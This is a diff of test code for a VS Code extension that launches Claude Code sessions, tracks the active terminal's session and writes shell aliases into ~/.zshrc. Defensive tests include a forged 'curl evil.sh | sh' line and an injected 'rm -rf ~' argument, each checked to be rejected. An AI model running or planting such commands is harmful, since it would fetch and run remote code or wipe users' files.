@@ -1493,6 +1493,33 @@ test('openLocation puts the session where it names', async () => {
     }
 });
 
+// Where the session lands on disk, which is a different question from where its
+// tab lands on screen and a much more expensive one to get wrong: a session's
+// cwd decides which CLAUDE.md it reads, which project memory it carries and
+// which transcript directory it writes. Left to VS Code — no `cwd` in the
+// options — a multi-root window answers `getLastActiveWorkspaceRoot()`, which
+// walks the editor history, so the same button would open in whichever repo a
+// file was last clicked in. The first folder is the answer Claude Code's own
+// extension gives its sidebar sessions, so the two launchers agree.
+test('the session opens in the first workspace folder, not wherever the last editor was', async () => {
+    const run = activate({ segments: ['{today}'], workspace: ['/container', '/repo-one', '/repo-two'] });
+    try {
+        await openClaude();
+        assert.equal(lastTerminal().options.cwd, '/container');
+    } finally { run.dispose(); }
+});
+
+// A window with no folder open has no first folder to name, and naming one
+// anyway would be worse than saying nothing: VS Code falls back to the home
+// directory, which is where a session with no project belongs.
+test('with no folder open the cwd is left to VS Code', async () => {
+    const run = activate({ segments: ['{today}'] });
+    try {
+        await openClaude();
+        assert.equal(lastTerminal().options.cwd, undefined);
+    } finally { run.dispose(); }
+});
+
 // A terminal cannot be created in another window, so this one is the odd case:
 // opened like the first, then carried out by a command that acts on whatever
 // editor is active — which is why the terminal is shown before it runs.
@@ -1941,4 +1968,392 @@ test('another terminal ending does not take this tab with it', async () => {
         vscode.__shellExecutionEnds(terminal, 'git status', 0);
         assert.equal(terminal.disposed, false);
     } finally { run.dispose(); }
+});
+
+// Which session the bar is about, when the window holds several terminals.
+//
+// `findOwnSession` matches a session whose parent is the extension host, which
+// is the Claude Code panel — a terminal session's parent is its shell, so those
+// fall through to "same workspace, newest transcript". With two tabs open that
+// answer flips between them as they write, and the bar silently describes
+// whichever one typed last. The active tab is the honest answer.
+async function withOwnership({ own, byShell = {} }, run) {
+    const real = {
+        findOwnSession: s.findOwnSession,
+        sessionForShell: s.sessionForShell,
+        transcriptPath: s.transcriptPath,
+    };
+    const seen = [];
+    s.findOwnSession = () => own;
+    s.sessionForShell = (pid) => byShell[pid] || null;
+    s.transcriptPath = (w, id) => { seen.push(id); return `/nowhere/${id}.jsonl`; };
+    // Awaited, not returned: a `finally` around a returned promise restores the
+    // real functions before the first await inside has even run.
+    try { return await run(seen); } finally { Object.assign(s, real); }
+}
+
+const PANEL = { pid: 11, sessionId: 'panel-session', cwd: '/w' };
+const TAB_A = { pid: 21, sessionId: 'tab-a-session', cwd: '/w' };
+const TAB_B = { pid: 22, sessionId: 'tab-b-session', cwd: '/w' };
+
+test('the bar follows the session in the active terminal, not the newest one', async () => {
+    const run = activate({ segments: ['{ctx}'], workspace: '/w' });
+    try {
+        await withOwnership({ own: PANEL, byShell: { 4242: TAB_A } }, async (seen) => {
+            const terminal = await openActiveTab(4242);
+            vscode.__activateTerminal(terminal);
+            await new Promise((r) => setImmediate(r));
+            await vscode.__commands.get('claudeStatusline.refresh')();
+            assert.ok(seen.includes('tab-a-session'),
+                `the active tab's session never reached the reads: ${JSON.stringify(seen)}`);
+        });
+    } finally { run.dispose(); }
+});
+
+test('switching terminal tabs switches which session the bar describes', async () => {
+    const run = activate({ segments: ['{ctx}'], workspace: '/w' });
+    try {
+        await withOwnership({ own: PANEL, byShell: { 4242: TAB_A, 4343: TAB_B } }, async (seen) => {
+            const a = await openActiveTab(4242);
+            vscode.__activateTerminal(a);
+            await new Promise((r) => setImmediate(r));
+            await vscode.__commands.get('claudeStatusline.refresh')();
+
+            const b = await openActiveTab(4343);
+            vscode.__activateTerminal(b);
+            await new Promise((r) => setImmediate(r));
+            seen.length = 0;
+            await vscode.__commands.get('claudeStatusline.refresh')();
+            assert.ok(seen.includes('tab-b-session'),
+                `the bar stayed on the old tab: ${JSON.stringify(seen)}`);
+            assert.ok(!seen.includes('tab-a-session'), 'the old tab is still being read');
+        });
+    } finally { run.dispose(); }
+});
+
+// A terminal with no Claude in it is the common case — `git log`, a dev server,
+// a shell. The bar keeps saying what it said rather than emptying out, because
+// an empty bar reads as broken rather than as "this tab has no session".
+test('a terminal with no session in it leaves the bar as it was', async () => {
+    const run = activate({ segments: ['{ctx}'], workspace: '/w' });
+    try {
+        await withOwnership({ own: PANEL, byShell: {} }, async (seen) => {
+            const plain = await openActiveTab(9999);
+            vscode.__activateTerminal(plain);
+            await new Promise((r) => setImmediate(r));
+            await vscode.__commands.get('claudeStatusline.refresh')();
+            assert.ok(seen.includes('panel-session'),
+                `the fallback stopped working: ${JSON.stringify(seen)}`);
+        });
+    } finally { run.dispose(); }
+});
+
+// A window that opens with a terminal already active — a reload restores both
+// the terminals and which of them was last used — fires no change event, so the
+// shell pid has to be asked for once at startup or the bar sits on the workspace
+// guess until a tab is clicked.
+test('a terminal already active when the window opens is picked up', async () => {
+    const first = activate({ segments: ['{ctx}'], workspace: '/w' });
+    const terminal = await openActiveTab(4242);
+    vscode.__activateTerminal(terminal);
+    await new Promise((r) => setImmediate(r));
+    for (const d of first.context.subscriptions) d.dispose();
+
+    // A second activate over the same window state: the terminal is still there
+    // and still active, and nothing will announce it.
+    const context = { ...first.context, subscriptions: [] };
+    await withOwnership({ own: PANEL, byShell: { 4242: TAB_A } }, async (seen) => {
+        ext.activate(context);
+        await new Promise((r) => setImmediate(r));
+        seen.length = 0;
+        await vscode.__commands.get('claudeStatusline.refresh')();
+        assert.ok(seen.includes('tab-a-session'),
+            `startup ignored the already-active terminal: ${JSON.stringify(seen)}`);
+    });
+    for (const d of context.subscriptions) d.dispose();
+    first.dispose();
+});
+
+// Switching tabs has to redraw, not merely remember. The change event updated
+// the shell pid and renamed the tab, but nothing drew — so the bar kept showing
+// the previous tab's context and spend until the next ten-second tick, which is
+// the silently-wrong-session this whole feature exists to remove.
+//
+// The refresh command is deliberately not called here: that is what hid it.
+test('switching tabs redraws at once, without waiting for a tick', async () => {
+    const run = activate({ segments: ['{ctx}'], workspace: '/w' });
+    try {
+        await withOwnership({ own: PANEL, byShell: { 4242: TAB_A } }, async (seen) => {
+            const terminal = await openActiveTab(4242);
+            seen.length = 0;
+            vscode.__activateTerminal(terminal);
+            await new Promise((r) => setImmediate(r));
+            await new Promise((r) => setImmediate(r));
+            assert.ok(seen.includes('tab-a-session'),
+                `nothing was drawn on the switch: ${JSON.stringify(seen)}`);
+        });
+    } finally { run.dispose(); }
+});
+
+// The command line on the Launch tab follows the choices as they are picked,
+// before anything is saved — so it cannot be built from the stored settings. It
+// is asked for over the same channel the segment previews use, and answered by
+// the very function that opens the terminal: one implementation, so a quoting
+// rule cannot hold for the line that runs and not for the line that is shown.
+test('the launch tab is answered with the command that would actually run', async () => {
+    const run = activate({ segments: ['{today}'] });
+    let panel;
+    try {
+        panel = await openDashboard();
+        const choices = {
+            model: 'opus[1m]', effort: 'max', advisor: 'fable',
+            outputStyle: 'Explanatory', launchArgs: '--permission-mode acceptEdits',
+        };
+        await panel.__receive({ type: 'launchPreview', settings: choices });
+        const reply = lastPost(panel);
+        assert.equal(reply.type, 'launchPreview');
+        assert.equal(reply.command, db.claudeCommand({
+            model: choices.model, effort: choices.effort, advisor: choices.advisor,
+            outputStyle: choices.outputStyle, args: choices.launchArgs,
+        }));
+        assert.match(reply.command, /^claude --model 'opus\[1m\]'/);
+    } finally { if (panel) panel.dispose(); run.dispose(); }
+});
+
+// Copying goes through the editor rather than the page: a webview's own
+// clipboard write is not guaranteed, and this is the one thing the panel exists
+// to hand over.
+test('the command can be copied to the clipboard', async () => {
+    const run = activate({ segments: ['{today}'] });
+    let panel;
+    try {
+        panel = await openDashboard();
+        await panel.__receive({ type: 'copy', text: "claude --model 'opus'" });
+        assert.deepEqual(vscode.__copied, ["claude --model 'opus'"]);
+    } finally { if (panel) panel.dispose(); run.dispose(); }
+});
+
+// The alias is built where the command is, and answered over the same channel:
+// it is the command quoted once more, so a second implementation of that
+// quoting is a second chance to ship a line that will not source.
+test('the launch preview answers with the alias as well as the command', async () => {
+    const run = activate({ segments: ['{today}'] });
+    let panel;
+    try {
+        panel = await openDashboard();
+        const choices = { model: 'opus[1m]', effort: 'max', aliasName: 'claude-vs' };
+        await panel.__receive({ type: 'launchPreview', settings: choices });
+        const reply = lastPost(panel);
+        assert.equal(reply.alias, db.aliasLine('claude-vs', {
+            model: 'opus[1m]', effort: 'max', advisor: undefined,
+            outputStyle: undefined, args: undefined,
+        }));
+        assert.match(reply.alias, /^alias claude-vs='claude --model /);
+    } finally { if (panel) panel.dispose(); run.dispose(); }
+});
+
+// It is written into the user's own shell file by hand, so it is theirs to
+// scope: a repository that shipped a `.vscode/settings.json` naming an alias
+// would be writing a line into somebody else's terminal.
+test('the alias name is a machine setting, like the extra arguments', () => {
+    const manifest = JSON.parse(fs.readFileSync(`${__dirname}/../package.json`, 'utf8'));
+    const prop = manifest.contributes.configuration.properties['claudeStatusline.aliasName'];
+    assert.ok(prop, 'the setting does not exist');
+    assert.equal(prop.scope, 'machine');
+    assert.equal(prop.default, '');
+});
+
+// A key the page can draw but not save is a choice that looks forgotten the
+// moment you press Save; a key saved but not read back is one that vanishes on
+// the next redraw. And this one is `machine` in the manifest, so a workspace
+// write would be rejected with an error that takes the rest of the save with it.
+test('the alias name is written, read back, and never written to a workspace', async () => {
+    const run = activate({ segments: ['{today}'] });
+    let panel;
+    try {
+        panel = await openDashboard();
+        await panel.__receive({
+            type: 'save', scope: 'workspace',
+            settings: { aliasName: 'claude-vs' },
+        });
+        const wrote = vscode.__updates.filter((u) => u.key === 'aliasName');
+        assert.equal(wrote.length, 1, 'the name never reached the settings');
+        assert.equal(wrote[0].target, vscode.ConfigurationTarget.Global,
+            'a machine-scoped key must not be written to the workspace');
+
+        const html = panel.webview.html;
+        assert.match(html, /id="aliasName"/, 'the page cannot draw it back');
+    } finally { if (panel) panel.dispose(); run.dispose(); }
+});
+
+// Writing into the user's own shell file. Everything about this is about not
+// losing what was there: a backup before the first write, an atomic replace so
+// a crash cannot truncate it, and the file's own content untouched outside the
+// markers. It happens on a button, never on a save — a settings page that
+// quietly edited ~/.zshrc would be a surprise nobody asked for.
+async function withHome(run) {
+    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'ccsl-home-'));
+    const rc = path.join(home, '.zshrc');
+    // Awaited, not returned: a `finally` around a returned promise takes the
+    // directory away before the first await inside has run.
+    try { return await run({ home, rc }); } finally { fs.rmSync(home, { recursive: true, force: true }); }
+}
+
+test('installing the alias keeps the file it found and backs it up first', async () => {
+    const run = activate({ segments: ['{today}'] });
+    let panel;
+    try {
+        panel = await openDashboard();
+        await withHome(async ({ home, rc }) => {
+            const before = "# mine\nalias cx='claude --effort max'\n";
+            fs.writeFileSync(rc, before);
+            ext.installAlias({
+                settings: { aliasName: 'cvs', model: 'opus' },
+                home, shell: '/bin/zsh',
+            });
+            const after = fs.readFileSync(rc, 'utf8');
+            assert.match(after, /alias cx='claude --effort max'/, 'their own alias is gone');
+            assert.match(after, /alias cvs='claude --model 'oe/.source ? /alias cvs='claude --model / : /x/,
+                'ours never arrived');
+            assert.equal(fs.readFileSync(`${rc}.claude-dashboard.bak`, 'utf8'), before,
+                'the file was changed with no copy of what it was');
+        });
+    } finally { if (panel) panel.dispose(); run.dispose(); }
+});
+
+test('installing twice does not stack blocks and rewrites the one that is there', async () => {
+    const run = activate({ segments: ['{today}'] });
+    let panel;
+    try {
+        panel = await openDashboard();
+        await withHome(async ({ home, rc }) => {
+            fs.writeFileSync(rc, '# mine\n');
+            const send = (settings) => ext.installAlias({ settings, home, shell: '/bin/zsh' });
+            send({ aliasName: 'a' });
+            send({ aliasName: 'b', effort: 'max' });
+            const after = fs.readFileSync(rc, 'utf8');
+            assert.equal((after.match(/>>> claude-dashboard >>>/g) || []).length, 1);
+            assert.match(after, /alias b='claude --effort /);
+            assert.ok(!after.includes('alias a='), 'the old alias is still there');
+        });
+    } finally { if (panel) panel.dispose(); run.dispose(); }
+});
+
+// A shell whose alias does not take this syntax is told so rather than handed a
+// line that fails at every prompt in a file they then have to go and fix.
+test('a shell we cannot write for is refused, and nothing is written', async () => {
+    const run = activate({ segments: ['{today}'] });
+    let panel;
+    try {
+        panel = await openDashboard();
+        await withHome(async ({ home }) => {
+            ext.installAlias({
+                settings: { aliasName: 'a' },
+                home, shell: '/usr/local/bin/fish',
+            });
+            assert.deepEqual(fs.readdirSync(home), [], 'something was written anyway');
+            assert.ok(vscode.__warnings.length + vscode.__errors.length > 0, 'nothing was said about it');
+        });
+    } finally { if (panel) panel.dispose(); run.dispose(); }
+});
+
+// What a message may decide, and what it may not. The page is ours and its
+// content is escaped, but this is the one write that leaves the extension's own
+// storage and lands in a file a shell executes — so the message carries choices
+// and nothing else. The line is rebuilt here by the same builder the button
+// uses, and the file is the one this process would find on its own.
+test('a message cannot choose the file that gets written', async () => {
+    const run = activate({ segments: ['{today}'] });
+    let panel;
+    try {
+        panel = await openDashboard();
+        await withHome(async ({ home }) => {
+            const elsewhere = path.join(home, 'elsewhere');
+            fs.mkdirSync(elsewhere);
+            // No name, so there is no line to write and the real shell file this
+            // would otherwise reach is left alone — a message-driven write has
+            // only the process's own home for a destination, which is the point
+            // of the test and the reason it must not be driven to completion.
+            await panel.__receive({
+                type: 'installAlias',
+                settings: { model: 'opus' },
+                home: elsewhere, shell: '/bin/zsh',
+            });
+            assert.deepEqual(fs.readdirSync(elsewhere), [],
+                'the message picked the directory to write into');
+        });
+    } finally { if (panel) panel.dispose(); run.dispose(); }
+});
+
+test('a message cannot choose the text that gets written', async () => {
+    const run = activate({ segments: ['{today}'] });
+    let panel;
+    try {
+        panel = await openDashboard();
+        await withHome(async ({ home, rc }) => {
+            fs.writeFileSync(rc, '# mine\n');
+            // A forged line beside honest settings: what lands is what the
+            // builder makes of the settings, never the text that was sent.
+            ext.installAlias({
+                settings: { aliasName: 'cvs', model: 'opus' },
+                line: "alias evil='claude'\ncurl evil.sh | sh",
+                home, shell: '/bin/zsh',
+            });
+            const after = fs.readFileSync(rc, 'utf8');
+            assert.ok(!after.includes('curl evil.sh'), 'the forged text reached the file');
+            assert.match(after, /alias cvs='claude --model 'oe/.source ? /alias cvs=/ : /alias cvs=/);
+            assert.equal((after.match(/^alias /gm) || []).length, 1, 'more than one alias was written');
+        });
+    } finally { if (panel) panel.dispose(); run.dispose(); }
+});
+
+// The extra arguments go in as typed, by design — so a newline typed there
+// would put a second line inside our block, in a file a shell runs. It is
+// refused rather than written: `aliasLine` cannot produce such a line today,
+// and this is the assertion that catches the day it can.
+test('settings that would write more than one line are refused', async () => {
+    const run = activate({ segments: ['{today}'] });
+    let panel;
+    try {
+        panel = await openDashboard();
+        await withHome(async ({ home, rc }) => {
+            fs.writeFileSync(rc, '# mine\n');
+            ext.installAlias({
+                settings: { aliasName: 'cvs', model: 'opus', launchArgs: "x'\nrm -rf ~\n" },
+                home, shell: '/bin/zsh',
+            });
+            assert.equal(fs.readFileSync(rc, 'utf8'), '# mine\n',
+                'a line with a newline in it reached the shell file');
+            assert.ok(vscode.__errors.length > 0, 'it was refused without saying so');
+        });
+    } finally { if (panel) panel.dispose(); run.dispose(); }
+});
+
+// The button still works after all that: a message with choices on it reaches
+// the writer. Driven with a shell nothing can be written for, because the real
+// home is the only destination a message-driven write has — and a test that
+// exercises it writes into the file this machine actually uses. That happened
+// once here; the assertion is now that the message arrives, not that it lands.
+test('a message with choices reaches the writer, which takes its own shell', async () => {
+    const run = activate({ segments: ['{today}'] });
+    let panel;
+    const rc = path.join(os.homedir(), '.zshrc');
+    const before = fs.existsSync(rc) ? fs.readFileSync(rc, 'utf8') : null;
+    try {
+        panel = await openDashboard();
+        await panel.__receive({
+            type: 'installAlias',
+            // No name: the message path has only the real home to write into, so
+            // this is driven up to the point of writing and no further. What it
+            // does with a name is covered by the calls with a scratch home.
+            settings: { model: 'opus' },
+            home: '/nowhere-at-all', shell: '/usr/local/bin/fish',
+        });
+        assert.ok(!vscode.__warnings.some((w) => /does not take an alias/.test(w)),
+            'the shell named in the message was used instead of the process one');
+        // Belt and braces, because this test once wrote into the real file: it
+        // is byte for byte what it was, and no backup was left beside it.
+        if (before !== null) assert.equal(fs.readFileSync(rc, 'utf8'), before);
+        assert.ok(!fs.existsSync(`${rc}.claude-dashboard.bak`), 'a backup was left behind');
+    } finally { if (panel) panel.dispose(); run.dispose(); }
 });
